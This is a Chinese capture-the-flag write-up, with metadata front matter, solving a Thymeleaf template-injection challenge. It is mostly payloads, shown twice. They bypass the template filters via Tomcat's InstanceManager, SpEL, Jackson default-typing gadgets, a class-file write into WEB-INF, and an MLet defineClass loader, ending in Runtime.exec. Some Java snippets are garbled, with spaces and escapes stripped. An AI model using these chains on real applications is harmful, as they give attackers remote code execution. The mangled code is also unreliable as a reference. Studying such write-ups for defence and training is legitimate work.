---
title: ssti 挑战——wp
contest: ssti-challenge
year: 2024
difficulty: hard
vuln_type: web_unknown
tags:
- thymeleaf-ssti
- s2-061
- instance-manager
- spel
- jackson-defaulttyping
- mlet
- classloader
attack_chain:
- Thymeleaf 3 阻断 `$$` 和 `new
- 借鉴 S2-061 拿 org.apache.tomcat.InstanceManager
- '@servletContext.getAttribute(''org.apache.tomcat.InstanceManager'')'
- newInstance('SpelExpressionParser') 创建 SpEL
- Jackson ObjectMapper enableDefaultTyping
- constructFromCanonical 创建 JavaType
- MLet 远程加载恶意 class
- SpEL 表达式 Runtime.exec
key_payload: S2-061 InstanceManager + Jackson + SpEL + MLet
one_liner: Thymeleaf SSTI 3 层防护绕过，S2-061 + Jackson + SpEL 完整利用链。
lesson: 当 SSTI 阻断 `$$` 和 `new` 时，可以借助 InstanceManager 实例化类。
quality: high
full_path: ssti挑战——wp.full.md
meta_path: ssti挑战——wp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: ssti 挑战——wp。Thymeleaf SSTI 3 层防护绕过，S2-061 + Jackson + SpEL 完整利用链。。关键路径：Thymeleaf 3 阻断 `$$` 和 `new → 借鉴 S2-061 拿 org.apache.tomcat.InstanceManager → @servletContext.getAttribute('org.apache.tomcat.I...
category: web
subcategory: web_other
time_required: long
difficulty_score: 4
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/301690.html
reasoning_chain:
- Thymeleaf 3 阻断 $$ 和 new（最新版还封堵 T 和 Class.forName()）→ 触发点：必须从内置对象获取类实例化能力
- S2-061 通过 ognl 内置对象 application 取 org.apache.catalina.core.DefaultInstanceManager → 假设：thymeleaf 也可走 servletContext
- 动作：@servletContext.getAttribute('org.apache.tomcat.InstanceManager') → 观察：拿到 InstanceManager
- InstanceManager.newInstance('org.springframework.expression.spel.standard.SpelExpressionParser') → 假设：可实例化 SpEL 解析器
- 动作：构造 multi-request payload 用 setAttribute 暂存中间对象（SpEL parser + payload 字符串）→ 观察：模板解析命中后执行 SpEL
- Jackson ObjectMapper enableDefaultTyping + constructFromCanonical('...SpelExpressionParser') + readValue('{}',javaType) → 假设：另一条通过 Jackson 反序列化拿 SpEL 的路径
- MLet 远程加载恶意 class → cglib ReflectUtils.defineClass + javax.management.loading.MLet + Base64 解码 → 假设：再上一阶通过自定义 classloader 加载任意字节码
- 假设：最终调用链 T(java.lang.Runtime).getRuntime().exec('calc') → 观察：执行任意命令 → 完成
failed_attempts:
- '试图用 Thymeleaf 自带的 #ctx.getBean() → 失败：Spring 没暴露 bean 工厂'
- 试图用 Class.forName() 直接实例化 → 失败：最新版 Thymeleaf 拦截
- 试图用 ReflectionUtils 直接拿 Class → 失败：白名单 classloader
key_observations:
- 当 SSTI 阻断 $$ 和 new 时，可以借助 InstanceManager 实例化类（S2-061 同源）
- Jackson enableDefaultTyping + readValue 是 Java 反序列化拿任意类的另一条路径
- Thymeleaf 模板的多请求链：先用 setAttribute 暂存对象再 parseExpression 把多个表达式串联
- MLet 远程加载恶意 class 是 Java WebShell 投递的工业级路径
prerequisites:
- Thymeleaf 模板注入原理（SpEL/OGNL 表达式）
- Tomcat InstanceManager 与 servletContext 反射获取
- Jackson enableDefaultTyping + Java 反序列化
- JMX MLet + cglib ReflectUtils.defineClass
---
# ssti挑战——wp

> 原文: https://www.ctfiot.com/301690.html
> ID: 301690

前文

ssti挑战——有奖金

奖金获取情况，因为自己的失误改动过题目，因此改动前后的挑战者独立计算奖金。

改动前，JZX第一名，Miku0x39第二名。其中JZX在改动后也做出了非常优秀的解。

改动后，无敌暴龙战士第一名，JZX第二名，貔貅第三名，77/glzjin/北辰/chao也都做了出来。

无敌暴龙战士/貔貅/glzjin和预期解几乎一样，那就先说预期解，也就是thymeleaf模板注入。可以先阅读

Thymeleaf SSTI bypass历史

这题本质上有三层防护。

第一层防护，不让用$$。

__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd","test")}|__::.

第二层防护，不让用new。

而最新版thymeleaf将T和Class.forName()都封堵了，看起来几乎无法实例化类了。

我们可以从S2-061上取经，S2-061是从ognl的内置对象application上取到了org.apache.catalina.core.DefaultInstanceManager。

有两种方法都取得到

@servletContext.getAttribute('org.apache.tomcat.InstanceManager')#ctx.getExchange().getApplication().getAttributeValue("org.apache.tomcat.InstanceManager")

__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd",@servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('org.springframework.expression.spel.standard.SpelExpressionParser').toString())}|__::.

这个就有多种小技巧。

1，利用一个不存在的函数单个请求执行多行代码

2，对反复使用的对象注册临时变量

__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write("qqq"))}|__::.

@servletContext.setAttribute("key","value")#ctx.getExchange().getApplication().getNativeServletContextObject().setAttribute("key","value")

__|$*{@servletContext.setAttribute("p",@servletContext.getAttribute("org.apache.tomcat.InstanceManager").newInstance("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("spel","n"%2B"ew java.util.Scanner(T"%2B"(java.lang.Runtime).getRuntime().exec('ping 127.0.0.1').getInputStream()).useDelimiter('\a').next()")}|__::.__|$*{@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()}|__::.__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write(@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()))}|__::.

__|$*{@servletContext.setAttribute("spel",@servletContext.getAttribute("spel")%2B"QQQQQQQQQQQQQQ")}|__::.

new.com.fasterxml.jackson.databind.ObjectMapper()

__|**{#ctx.x(#r=#ctx.getExchange().getNativeRequestObject(),#f=#r.getServletContext().getRealPath("WEB-INF/classes/BS.class"),new.ch.qos.logback.core.FileAppender().openFile(#f),#r.getParts().get(0).write(#f),new.BS())}|__::.

//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); JavaTypejavaType=mapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"); SpelExpressionParserparser= mapper.readValue("{}", javaType); parser.parseExpression("T (java.lang.Runtime).getRuntime().exec("calc")").getValue();

__|$*{@jacksonObjectMapper.enableDefaultTyping()}|__::.__|$*{@servletContext.setAttribute("javatype",@jacksonObjectMapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("parser",@jacksonObjectMapper.readValue("{}",@servletContext.getAttribute("javatype")))}|__::.__|$*{@servletContext.getAttribute("parser").parseExpression("T"%2B" (java.lang.Runtime).getRuntime().exec('calc')").getValue()}|__::.

//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); Stringjson1="{rn" +" "a": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {"staticMethod":"java.lang.Runtime.getRuntime"}rn" +" ],rn" +" "b": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {rn" +" "targetMethod":"exec",rn" +" "arguments": ["calc"]rn" +" }rn" +" ]" +"}"; System.out.println(json1.replaceAll("\s+","")); LinkedHashMapmap=mapper.readValue(json1,LinkedHashMap.class); MethodInvokingFactoryBeanbeanA= (MethodInvokingFactoryBean) map.get("a"); beanA.afterPropertiesSet(); Runtimeruntime= (Runtime)beanA.getObject(); MethodInvokingFactoryBeanbeanB= (MethodInvokingFactoryBean) map.get("b"); beanB.setTargetObject(runtime); beanB.afterPropertiesSet(); beanB.getObject();

@resourceHandlerMapping.urlMap.getClass()

username=__|$*{@jacksonObjectMapper.readValue("{}",@jacksonObjectMapper.getTypeFactory().findClass("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression(#ctx.getExchange().getNativeRequestObject().getParameter('a')).getValue()}|__::.&a=T(org.springframework.cglib.core.ReflectUtils).defineClass('payload.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgQQQQ'),newjavax.management.loading.MLet(newjava.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()


```
__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd","test")}|__::.
@servletContext.getAttribute('org.apache.tomcat.InstanceManager')#ctx.getExchange().getApplication().getAttributeValue("org.apache.tomcat.InstanceManager")
__|$*{#ctx.getExchange().getNativeResponseObject().addHeader("cmd",@servletContext.getAttribute('org.apache.tomcat.InstanceManager').newInstance('org.springframework.expression.spel.standard.SpelExpressionParser').toString())}|__::.
__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write("qqq"))}|__::.
@servletContext.setAttribute("key","value")#ctx.getExchange().getApplication().getNativeServletContextObject().setAttribute("key","value")
__|$*{@servletContext.setAttribute("p",@servletContext.getAttribute("org.apache.tomcat.InstanceManager").newInstance("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("spel","n"%2B"ew java.util.Scanner(T"%2B"(java.lang.Runtime).getRuntime().exec('ping 127.0.0.1').getInputStream()).useDelimiter('\a').next()")}|__::.__|$*{@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()}|__::.__|$*{qqq(#w=#ctx.getExchange().getNativeResponseObject().getWriter(),#w.flush(),#w.write(@servletContext.getAttribute("p").parseExpression(@servletContext.getAttribute("spel")).getValue()))}|__::.
__|$*{@servletContext.setAttribute("spel",@servletContext.getAttribute("spel")%2B"QQQQQQQQQQQQQQ")}|__::.
new.com.fasterxml.jackson.databind.ObjectMapper()
__|**{#ctx.x(#r=#ctx.getExchange().getNativeRequestObject(),#f=#r.getServletContext().getRealPath("WEB-INF/classes/BS.class"),new.ch.qos.logback.core.FileAppender().openFile(#f),#r.getParts().get(0).write(#f),new.BS())}|__::.
//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); JavaTypejavaType=mapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"); SpelExpressionParserparser= mapper.readValue("{}", javaType); parser.parseExpression("T (java.lang.Runtime).getRuntime().exec("calc")").getValue();
__|$*{@jacksonObjectMapper.enableDefaultTyping()}|__::.__|$*{@servletContext.setAttribute("javatype",@jacksonObjectMapper.getTypeFactory().constructFromCanonical("org.springframework.expression.spel.standard.SpelExpressionParser"))}|__::.__|$*{@servletContext.setAttribute("parser",@jacksonObjectMapper.readValue("{}",@servletContext.getAttribute("javatype")))}|__::.__|$*{@servletContext.getAttribute("parser").parseExpression("T"%2B" (java.lang.Runtime).getRuntime().exec('calc')").getValue()}|__::.
//@jacksonObjectMapper ObjectMappermapper=newObjectMapper(); mapper.enableDefaultTyping(); Stringjson1="{rn" +" "a": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {"staticMethod":"java.lang.Runtime.getRuntime"}rn" +" ],rn" +" "b": [rn" +" "org.springframework.beans.factory.config.MethodInvokingFactoryBean",rn" +" {rn" +" "targetMethod":"exec",rn" +" "arguments": ["calc"]rn" +" }rn" +" ]" +"}"; System.out.println(json1.replaceAll("\s+","")); LinkedHashMapmap=mapper.readValue(json1,LinkedHashMap.class); MethodInvokingFactoryBeanbeanA= (MethodInvokingFactoryBean) map.get("a"); beanA.afterPropertiesSet(); Runtimeruntime= (Runtime)beanA.getObject(); MethodInvokingFactoryBeanbeanB= (MethodInvokingFactoryBean) map.get("b"); beanB.setTargetObject(runtime); beanB.afterPropertiesSet(); beanB.getObject();
@resourceHandlerMapping.urlMap.getClass()
username=__|$*{@jacksonObjectMapper.readValue("{}",@jacksonObjectMapper.getTypeFactory().findClass("org.springframework.expression.spel.standard.SpelExpressionParser")).parseExpression(#ctx.getExchange().getNativeRequestObject().getParameter('a')).getValue()}|__::.&a=T(org.springframework.cglib.core.ReflectUtils).defineClass('payload.SpringEcho',T(org.springframework.util.Base64Utils).decodeFromString('yv66vgQQQQ'),newjavax.management.loading.MLet(newjava.net.URL[0],T(java.lang.Thread).currentThread().getContextClassLoader())).newInstance()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]